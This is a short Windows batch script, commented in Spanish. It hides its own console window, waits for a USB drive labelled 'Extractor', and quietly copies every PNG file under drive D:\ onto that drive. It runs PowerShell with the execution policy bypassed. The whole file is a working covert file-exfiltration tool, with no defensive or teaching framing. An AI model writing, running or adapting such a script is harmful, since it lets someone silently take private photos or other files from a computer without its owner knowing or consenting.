@echo off

:: Ejecutarse en segundo plano si no lo esta
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

set ORIGEN=D:\
set NOMBRE_USB=Extractor

for /f "delims=" %%D in ('powershell -NoProfile -Command "(Get-Volume | Where-Object {$_.FileSystemLabel -eq '%NOMBRE_USB%'}).DriveLetter"') do (
    set DRIVE=%%D
)

if "%DRIVE%"=="" exit

set DESTINO=%DRIVE%:\

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
" $fotos = Get-ChildItem -Path '%ORIGEN%' -Recurse -File -Filter *.png; ^
  foreach ($foto in $fotos) { ^
      Copy-Item -Path $foto.FullName -Destination '%DESTINO%' -Force; ^
  }"